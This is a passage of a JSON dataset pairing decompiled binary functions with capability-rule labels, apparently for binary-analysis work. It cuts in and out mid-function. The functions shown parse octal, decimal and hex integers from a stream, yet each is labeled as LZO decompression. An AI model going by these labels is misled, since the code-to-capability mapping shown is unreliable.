0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00450410(var_40h);\n                if (cVar3 != '\\0') goto code_r0x004721f8;\n                uVar6 = fcn.004504b0();\n            } while( true );\n        }\n        var_35h._0_1_ = '\\0';\n        var_3ch._0_2_ = 0;\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x00472660;\ncode_r0x004725e7:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x00472660;\n        if (stack0xffffffc8 != 0) {\n            fcn.0048cc10(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00472610:\n            uVar14 = arg_8h[2];\n            if (arg_8h[3] <= uVar14) goto code_r0x004726c5;\n            do {\n                arg_8h[2] = uVar14 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00450410(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x004721f8;\n                    uVar6 = fcn.004504b0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x004725e7;\ncode_r0x00472660:\n                    puVar11 = iVar8 + 0x78;\n                    uVar14 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00472490;\n                    while (*puVar11 != uVar6) {\n                        uVar14 = uVar14 - 1;\n                        puVar11 = puVar11 + 1;\n                        if (uVar14 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x004721f8;\n                        }\n                    }\n                    iVar12 = puVar11 - (iVar8 + 0x78);\n                    iVar9 = iVar12 >> 1;\n                    if (0x1e < iVar12) {\n                        iVar9 = iVar9 + -6;\n                    }\n                    if (var_3ch <= var_48h) {\n                        var_36h = var_36h | 0xffff - iVar9 < (var_3ch * uVar15 & 0xffff);\n                        var_3ch = iVar9 + var_3ch * uVar15;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00472610;\n                    }\n                    uVar14 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar14 < arg_8h[3]) break;\ncode_r0x004726c5:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_36h = 0;\n        var_3ch._0_2_ = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x004721f8:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x004724a0;\ncode_r0x00472206:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x004724ed:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar6 = -var_3ch;\n                if (!bVar16) {\n                    uVar6 = var_3ch;\n                }\n                *arg_20h = uVar6;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0047222c;\n        }\n    }\n    goto code_r0x0047221b;\ncode_r0x00472490:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00472206;\ncode_r0x004724a0:\n    cVar3 = cVar5;\n    fcn.0048cc10(var_35h._1_1_);\n    cVar5 = fcn.004bdf60(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x004724ed;\ncode_r0x0047221b:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0047222c:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3785
    },
    "00472820": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00472820(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    char cVar6;\n    uint8_t uVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint16_t *puVar13;\n    int32_t iVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    bool bVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    ulong uVar21;\n    int32_t var_64h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_32h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar14 = arg_18h;\n    iVar10 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar11 = *(iVar14 + 0xc) & 0x4a;\n    if (uVar11 == 0x40) {\n        var_48h = 8;\ncode_r0x0047285f:\n        uVar3 = fcn.00450410(&arg_10h);\n        if (uVar3 == 0) {\ncode_r0x0047287e:\n            var_40h = &arg_10h;\n            uVar8 = fcn.004504b0();\n            bVar20 = *(iVar10 + 0x70) == uVar8;\n            if (bVar20) {\n                cVar6 = *(iVar10 + 0x10);\ncode_r0x004728b1:\n                if (((cVar6 != '\\0') && (*(iVar10 + 0x26) == uVar8)) || (*(iVar10 + 0x24) == uVar8))\n                goto code_r0x00472b98;\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                uVar3 = fcn.00450410(var_40h);\n                var_38h = 0;\n                bVar19 = false;\n                if (uVar3 == 0) {\n                    uVar8 = fcn.004504b0();\n                    cVar6 = *(iVar10 + 0x10);\n                    goto code_r0x00472b98;\n                }\n            }\n            else {\n                cVar6 = *(iVar10 + 0x10);\n                if (*(iVar10 + 0x72) == uVar8) goto code_r0x004728b1;\ncode_r0x00472b98:\n                var_38h = 0;\n                bVar19 = false;\n                while (((cVar6 == '\\0' || (*(iVar10 + 0x26) != uVar8)) && (*(iVar10 + 0x24) != uVar8))) {\n                    if (*(iVar10 + 0x78) == uVar8) {\n                        bVar17 = var_48h == 10 | bVar19 ^ 1U;\n                        if (!bVar17) goto code_r0x00472be2;\n                        bVar19 = uVar11 == 0 || var_48h == 8;\n                        if (uVar11 != 0 && var_48h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x00472c1b;\n                        }\n                        var_38h = 0;\n                        var_48h = 8;\n                        uVar16 = arg_8h[2];\n                        if (arg_8h[3] <= uVar16) {\n                            var_48h = 8;\n                            goto code_r0x00472cd0;\n                        }\ncode_r0x00472c2a:\n                        arg_8h[2] = uVar16 + 2;\ncode_r0x00472c39:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar17 = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            bVar17 = true;\n                        }\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x00472be2:\n                        if ((*(iVar10 + 0x74) != uVar8) && (*(iVar10 + 0x76) != uVar8)) {\n                            uVar3 = 0;\n                            bVar19 = true;\n                            goto code_r0x00472910;\n                        }\n                        uVar3 = var_48h == 0x10 || uVar11 == 0;\n                        if (var_48h != 0x10 && uVar11 != 0) {\n                            bVar19 = true;\n                            goto code_r0x0047291c;\n                        }\n                        var_38h = 0;\n                        var_48h = 0x10;\n                        bVar17 = false;\ncode_r0x00472c1b:\n                        uVar16 = arg_8h[2];\n                        bVar19 = bVar17;\n                        if (uVar16 < arg_8h[3]) goto code_r0x00472c2a;\ncode_r0x00472cd0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00472c39;\n                        bVar17 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar5 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar5 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar5 = bVar15;\n                        }\n                    }\n                    if (bVar5 == bVar17) {\n                        uVar3 = 1;\n                        goto code_r0x00472910;\n                    }\n                    uVar8 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar8 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar6 = *(iVar10 + 0x10);\n                }\n                uVar3 = 0;\n            }\ncode_r0x00472910:\n            var_4ch = 0x16;\n            if (var_48h != 0x10) goto code_r0x0047291c;\n        }\n        else {\n            uVar8 = 0;\n            var_38h = 0;\n            bVar19 = false;\n            bVar20 = false;\ncode_r0x0047291c:\n            var_4ch = var_48h;\n        }\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        if (*(iVar10 + 0x10) != '\\0') {\ncode_r0x00473080:\n            fcn.0048c930(0x20);\n        }\n        var_40h = &arg_10h;\n        var_60h = 0;\n        var_5ch = -0x80000000;\n        if (!bVar20) {\n            var_60h = 0xffffffff;\n            var_5ch = 0x7fffffff;\n        }\n        uVar21 = fcn.00437f00(var_60h, var_5ch, var_48h, 0);\n        uVar11 = uVar21 >> 0x20;\n        var_32h = *(iVar10 + 0xa4);\n        if (var_32h == 0) {\n            if (uVar3 == 0) {\n                uVar16 = 0;\n                uVar18 = 0;\n                var_32h = uVar3;\n                do {\n                    uVar12 = uVar8;\n                    if (var_4ch < 0xb) {\n                        if ((uVar8 < 0x30) || (var_4ch + 0x30U <= uVar8)) goto code_r0x00472d82;\ncode_r0x004729ec:\n                        uVar1 = uVar12 - 0x30;\n                    }\n                    else {\n                        if (uVar8 - 0x30 < 10) goto code_r0x004729ec;\n                        uVar1 = uVar12 - 0x57;\n                        if (5 < uVar8 - 0x61) {\n                            if (5 < uVar8 - 0x41) goto code_r0x00472d82;\n                            uVar1 = uVar12 - 0x37;\n                        }\n                    }\n                    if (uVar1 == 0xffffffff) goto code_r0x00472d82;\n                    if (uVar11 < uVar18 || uVar11 - uVar18 < (uVar21 < uVar16)) {\n                        var_32h = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00472e37;\ncode_r0x00472a4f:\n                        arg_8h[2] = uVar12 + 2;\n                    }\n                    else {\n                        uVar12 = uVar16 * var_48h;\n                        uVar18 = (uVar16 * var_48h >> 0x20) + var_48h * uVar18;\n                        uVar16 = (var_5ch - (uVar1 >> 0x1f)) - (var_60h < uVar1);\n                        var_32h = var_32h | (uVar16 < uVar18 || uVar16 - uVar18 < (var_60h - uVar1 < uVar12));\n                        uVar16 = uVar12 + uVar1;\n                        uVar18 = uVar18 + (uVar1 >> 0x1f) + CARRY4(uVar12, uVar1);\n                        var_38h = var_38h + 1;\n                        uVar12 = arg_8h[2];\n                        if (uVar12 < arg_8h[3]) goto code_r0x00472a4f;\ncode_r0x00472e37:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    uVar4 = fcn.00450410(var_40h);\n                    uVar7 = uVar3;\n                    if (uVar4 != 0) goto code_r0x00472a79;\n                    uVar8 = fcn.004504b0();\n                } while( true );\n            }\n            uVar16 = 0;\n            uVar18 = 0;\n            uVar4 = uVar3;\n            uVar7 = 0;\n        }\n        else {\ncode_r0x00472ef2:\n            var_54h = uVar21 >> 0x20;\n            var_50h = uVar21;\n            if (uVar3 == 0) {\n                var_32h = 0;\n                uVar16 = 0;\n                uVar18 = 0;\n                uVar7 = *(iVar10 + 0x10);\n                if (uVar7 == 0) goto code_r0x00472f93;\ncode_r0x00472f18:\n                if (*(iVar10 + 0x26) != uVar8) goto code_r0x00472f93;\n                if (var_38h != 0) {\n                    fcn.0048cc10(var_38h);\n                    var_38h = 0;\ncode_r0x00472f41:\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x00473000;\n                    do {\n                        arg_8h[2] = uVar11 + 2;\n                        while( true ) {\n                            var_40h = &arg_10h;\n                            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                            uVar4 = fcn.00450410(var_40h);\n                            uVar7 = uVar3;\n                            if (uVar4 != 0) goto code_r0x00472a79;\n                            uVar8 = fcn.004504b0();\n                            uVar7 = *(iVar10 + 0x10);\n                            if (uVar7 != 0) goto code_r0x00472f18;\ncode_r0x00472f93:\n                            puVar13 = iVar10 + 0x78;\n                            uVar11 = var_4ch;\n                            if (uVar8 == *(iVar10 + 0x24)) goto code_r0x00472d82;\n                            while (*puVar13 != uVar8) {\n                                uVar11 = uVar11 - 1;\n                                puVar13 = puVar13 + 1;\n                                if (uVar11 == 0) {\n                                    uVar4 = 0;\n                                    uVar7 = uVar3;\n                                    goto code_r0x00472a79;\n                                }\n                            }\n                            iVar14 = puVar13 - (iVar10 + 0x78);\n                            uVar12 = iVar14 >> 1;\n                            uVar11 = uVar12 - 6;\n                            if (iVar14 < 0x1f) {\n                                uVar11 = uVar12;\n                            }\n                            if (uVar18 <= var_54h && (var_50h < uVar16) <= var_54h - uVar18) {\n                                uVar12 = uVar16 * var_48h;\n                                uVar18 = (uVar16 * var_48h >> 0x20) + var_48h * uVar18;\n                                uVar16 = (var_5ch - (uVar11 >> 0x1f)) - (var_60h < uVar11);\n                                var_32h = var_32h | (uVar16 < uVar18 || uVar16 - uVar18 < (var_60h - uVar11 < uVar12));\n                                uVar16 = uVar12 + uVar11;\n                                uVar18 = uVar18 + (uVar11 >> 0x1f) + CARRY4(uVar12, uVar11);\n                                var_38h = var_38h + 1;\n                                goto code_r0x00472f41;\n                            }\n                            var_32h = 1;\n                            uVar11 = arg_8h[2];\n                            if (uVar11 < arg_8h[3]) break;\ncode_r0x00473000:\n                            (**(*arg_8h + 0x28))();\n                        }\n                    } while( true );\n                }\n                uVar4 = 0;\n            }\n            else {\n                uVar16 = 0;\n                uVar18 = 0;\n                var_32h = 0;\n                uVar7 = 0;\n                uVar4 = uVar3;\n            }\n        }\n    }\n    else {\n        var_48h = 10;\n        if (uVar11 != 8) goto code_r0x0047285f;\n        var_48h = 0x10;\n        uVar4 = fcn.00450410(&arg_10h);\n        if (uVar4 == 0) goto code_r0x0047287e;\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        uVar3 = *(iVar10 + 0x10);\n        if (uVar3 != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            bVar19 = false;\n            bVar20 = false;\n            var_4ch = 0x16;\n            var_48h = 0x10;\n            goto code_r0x00473080;\n        }\n        var_32h = *(iVar10 + 0xa4);\n        bVar20 = false;\n        bVar19 = false;\n        if (var_32h != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            var_4ch = 0x16;\n            uVar21 = 0x7ffffffffffffff;\n            var_60h = 0xffffffff;\n            var_5ch = 0x7fffffff;\n            var_48h = 0x10;\n            uVar3 = var_32h;\n            goto code_r0x00472ef2;\n        }\n        uVar7 = 0;\n        uVar16 = 0;\n        uVar18 = 0;\n        var_38h = 0;\n    }\ncode_r0x00472a79:\n    uVar2 = uVar4;\n    uVar3 = uVar7;\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00472a87;\ncode_r0x00472d92:\n    uVar4 = uVar2;\n    fcn.0048cc10(var_38h);\n    cVar6 = fcn.004bdf60(*(iVar10 + 8), *(iVar10 + 0xc), &var_1eh + 2);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((var_38h != 0) || (bVar19)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00472de3;\n    goto code_r0x00472a9c;\ncode_r0x00472d82:\n    uVar4 = 0;\n    uVar2 = 0;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00472d92;\ncode_r0x00472a87:\n    if ((var_38h != 0) || (bVar19)) {\ncode_r0x00472de3:\n        if (uVar3 == 0) {\n            if (var_32h == 0) {\n                if (bVar20) {\n                    bVar19 = uVar16 != 0;\n                    uVar16 = -uVar16;\n                    uVar18 = -(uVar18 + bVar19);\n                }\n                *arg_20h = uVar16;\n                arg_20h[1] = uVar18;\n            }\n            else {\n                uVar11 = 0;\n                uVar16 = 0x80000000;\n                if (!bVar20) {\n                    uVar11 = 0xffffffff;\n                    uVar16 = 0x7fffffff;\n                }\n                *arg_20h = uVar11;\n                arg_20h[1] = uVar16;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00472ab5;\n        }\n    }\ncode_r0x00472a9c:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x00472ab5:\n    var_64h = &var_1eh + 1;\n    if (uVar4 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(var_64h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4669
    },
    "00473180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00473180(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint16_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    bool bVar6;\n    char cVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint16_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    ulong uVar21;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint8_t var_3eh;\n    int32_t var_3dh;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar10 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar11 = *(iVar4 + 0xc) & 0x4a;\n    if (uVar11 == 0x40) {\n        uVar18 = 8;\ncode_r0x004731bf:\n        var_3dh._0_1_ = fcn.00450410(&arg_10h);\n        if (var_3dh == '\\0') {\ncode_r0x004731de:\n            var_4ch = &arg_10h;\n            uVar8 = fcn.004504b0();\n            bVar20 = *(iVar10 + 0x70) == uVar8;\n            cVar5 = *(iVar10 + 0x10);\n            if ((((bVar20) || (*(iVar10 + 0x72) == uVar8)) && ((cVar5 == '\\0' || (*(iVar10 + 0x26) != uVar8)))) &&\n               (*(iVar10 + 0x24) != uVar8)) {\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_3dh._0_1_ = fcn.00450410(var_4ch);\n                stack0xffffffc0 = 0;\n                bVar19 = false;\n                if (var_3dh == '\\0') {\n                    uVar8 = fcn.004504b0();\n                    cVar5 = *(iVar10 + 0x10);\n                    goto code_r0x00473430;\n                }\n            }\n            else {\ncode_r0x00473430:\n                stack0xffffffc0 = 0;\n                bVar19 = false;\n                while (((cVar5 == '\\0' || (*(iVar10 + 0x26) != uVar8)) && (*(iVar10 + 0x24) != uVar8))) {\n                    if (*(iVar10 + 0x78) == uVar8) {\n                        bVar6 = uVar18 == 10 | bVar19 ^ 1U;\n                        if (!bVar6) goto code_r0x0047346c;\n                        bVar19 = uVar11 == 0 || uVar18 == 8;\n                        if (uVar11 != 0 && uVar18 != 8) {\n                            unique0x00007a80 = stack0xffffffc0 + 1;\n                            goto code_r0x004734a2;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar18 = 8;\n                        uVar14 = arg_8h[2];\n                        if (uVar14 < arg_8h[3]) goto code_r0x004734b1;\ncode_r0x004735b0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x004734c0;\n                        var_38h._0_1_ = true;\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x0047346c:\n                        if ((*(iVar10 + 0x74) != uVar8) && (*(iVar10 + 0x76) != uVar8)) {\n                            var_3dh._0_1_ = '\\0';\n                            bVar19 = true;\n                            goto code_r0x00473251;\n                        }\n                        var_3dh._0_1_ = uVar18 == 0x10 || uVar11 == 0;\n                        if (uVar18 != 0x10 && uVar11 != 0) {\n                            bVar19 = true;\n                            goto code_r0x0047325d;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar18 = 0x10;\n                        bVar6 = false;\ncode_r0x004734a2:\n                        uVar14 = arg_8h[2];\n                        bVar19 = bVar6;\n                        if (arg_8h[3] <= uVar14) goto code_r0x004735b0;\ncode_r0x004734b1:\n                        arg_8h[2] = uVar14 + 2;\ncode_r0x004734c0:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar9 = *arg_8h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_8h + 0x24))();\n                        }\n                        var_38h._0_1_ = false;\n                        if (iVar9 == -1) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar16 = arg_10h != NULL && arg_14h == -1;\n                    bVar6 = arg_14h == -1;\n                    if (bVar16) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar9 = *arg_10h[2];\n                        }\n                        else {\n                            iVar9 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar6 = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            bVar6 = bVar16;\n                        }\n                    }\n                    if (var_38h._0_1_ == bVar6) {\n                        var_3dh._0_1_ = '\\x01';\n                        goto code_r0x00473251;\n                    }\n                    uVar8 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar8 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar5 = *(iVar10 + 0x10);\n                }\n                var_3dh._0_1_ = '\\0';\n            }\ncode_r0x00473251:\n            var_50h = 0x16;\n            if (uVar18 == 0x10) goto code_r0x00473260;\n        }\n        else {\n            uVar8 = 0;\n            stack0xffffffc0 = 0;\n            bVar19 = false;\n            bVar20 = false;\n        }\ncode_r0x0047325d:\n        var_50h = uVar18;\n    }\n    else {\n        uVar18 = 10;\n        if (uVar11 != 8) goto code_r0x004731bf;\n        uVar18 = 0x10;\n        var_3dh._0_1_ = fcn.00450410(&arg_10h);\n        if (var_3dh == '\\0') goto code_r0x004731de;\n        uVar8 = 0;\n        stack0xffffffc0 = 0;\n        uVar18 = 0x10;\n        bVar19 = false;\n        bVar20 = false;\n        var_50h = 0x16;\n    }\ncode_r0x00473260:\n    cVar5 = var_3dh;\n    var_4ch = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar10 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar21 = fcn.00437f00(0xffffffff, 0xffffffff, uVar18, 0);\n    uVar11 = uVar21 >> 0x20;\n    uVar2 = *(iVar10 + 0xa4);\n    if (uVar2 == 0) {\n        var_3eh = 0;\n        if (var_3dh == '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            do {\n                uVar14 = uVar8;\n                if (var_50h < 0xb) {\n                    if ((uVar8 < 0x30) || (var_50h + 0x30U <= uVar8)) goto code_r0x00473660;\ncode_r0x0047330d:\n                    uVar14 = uVar14 - 0x30;\n                }\n                else {\n                    if (uVar8 - 0x30 < 10) goto code_r0x0047330d;\n                    if (uVar8 - 0x61 < 6) {\n                        uVar14 = uVar14 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar8 - 0x41) goto code_r0x00473660;\n                        uVar14 = uVar14 - 0x37;\n                    }\n                }\n                if (uVar14 == 0xffffffff) goto code_r0x00473660;\n                if (uVar11 < var_34h || uVar11 - var_34h < (uVar21 < var_38h)) {\n                    var_3eh = 1;\n                    uVar14 = arg_8h[2];\n                    if (uVar14 < arg_8h[3]) goto code_r0x0047337b;\ncode_r0x00473708:\n                    (**(*arg_8h + 0x28))();\n                }\n                else {\n                    uVar12 = var_38h * uVar18;\n                    uVar17 = (var_38h * uVar18 >> 0x20) + uVar18 * var_34h;\n                    uVar15 = ~(uVar14 >> 0x1f);\n                    var_3eh = var_3eh | (uVar15 < uVar17 || uVar15 - uVar17 < (~uVar14 < uVar12));\n                    var_38h = uVar14 + uVar12;\n                    var_34h = (uVar14 >> 0x1f) + uVar17 + CARRY4(uVar14, uVar12);\n                    uVar14 = arg_8h[2];\n                    unique0x00007a80 = stack0xffffffc0 + 1;\n                    if (arg_8h[3] <= uVar14) goto code_r0x00473708;\ncode_r0x0047337b:\n                    arg_8h[2] = uVar14 + 2;\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar5 = fcn.00450410(var_4ch);\n                if (cVar5 != '\\0') goto code_r0x004733a5;\n                uVar8 = fcn.004504b0();\n            } while( true );\n        }\n        var_38h = 0;\n        var_3dh._0_1_ = '\\0';\n        var_34h = 0;\n    }\n    else if (var_3dh == '\\0') {\n        puVar1 = iVar10 + 0x78;\n        var_3eh = 0;\n        cVar7 = *(iVar10 + 0x10);\n        var_38h = 0;\n        var_34h = 0;\n        if (cVar7 == '\\0') goto code_r0x00473840;\ncode_r0x004737c3:\n        if (*(iVar10 + 0x26) != uVar8) goto code_r0x00473840;\n        if (stack0xffffffc0 != 0) {\n            fcn.0048cc10(stack0xffffffc0);\n            stack0xffffffc0 = 0;\ncode_r0x004737ee:\n            uVar14 = arg_8h[2];\n            if (arg_8h[3] <= uVar14) goto code_r0x004738a7;\n            do {\n                arg_8h[2] = uVar14 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar5 = fcn.00450410(var_4ch);\n                    if (cVar5 != '\\0') goto code_r0x004733a5;\n                    uVar8 = fcn.004504b0();\n                    cVar7 = *(iVar10 + 0x10);\n                    if (cVar7 != '\\0') goto code_r0x004737c3;\ncode_r0x00473840:\n                    if (uVar8 == *(iVar10 + 0x24)) goto code_r0x00473660;\n                    uVar3 = *puVar1;\n                    puVar13 = puVar1;\n                    uVar14 = var_50h;\n                    while (uVar3 != uVar8) {\n                        puVar13 = puVar13 + 1;\n                        uVar14 = uVar14 - 1;\n                        if (uVar14 == 0) goto code_r0x00473660;\n                        uVar3 = *puVar13;\n                    }\n                    uVar12 = puVar13 - puVar1 >> 1;\n                    uVar14 = uVar12 - 6;\n                    if (puVar13 - puVar1 < 0x1f) {\n                        uVar14 = uVar12;\n                    }\n                    if (var_34h <= uVar11 && (uVar21 < var_38h) <= uVar11 - var_34h) {\n                        uVar12 = var_38h * uVar18;\n                        uVar17 = var_34h * uVar18 + (var_38h * uVar18 >> 0x20);\n                        uVar15 = ~(uVar14 >> 0x1f);\n                        var_3eh = var_3eh | (uVar15 < uVar17 || uVar15 - uVar17 < (~uVar14 < uVar12));\n                        var_38h = uVar14 + uVar12;\n                        var_34h = (uVar14 >> 0x1f) + uVar17 + CARRY4(uVar14, uVar12);\n                        unique0x00007a80 = stack0xffffffc0 + 1;\n                        goto code_r0x004737ee;\n                    }\n                    uVar14 = arg_8h[2];\n                    var_3eh = uVar2;\n                    if (uVar14 < arg_8h[3]) break;\ncode_r0x004738a7:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar5 = '\\0';\n        var_3dh._0_1_ = cVar7;\n    }\n    else {\n        var_38h = 0;\n        var_34h = 0;\n        var_3eh = 0;\n        var_3dh._0_1_ = '\\0';\n    }\ncode_r0x004733a5:\n    cVar7 = cVar5;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00473670;\ncode_r0x004733b3:\n    if ((stack0xffffffc0 != 0) || (bVar19)) {\ncode_r0x004736be:\n        if (var_3dh == '\\0') {\n            if (var_3eh == 0) {\n                if (bVar20) {\n                    bVar19 = var_38h != 0;\n                    var_38h = -var_38h;\n                    var_34h = -(var_34h + bVar19);\n                }\n                *arg_20h = var_38h;\n                arg_20h[1] = var_34h;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004733e1;\n        }\n    }\n    goto code_r0x004733c8;\ncode_r0x00473660:\n    cVar5 = '\\0';\n    cVar7 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x004733b3;\ncode_r0x00473670:\n    cVar5 = cVar7;\n    fcn.0048cc10(var_3dh._1_1_);\n    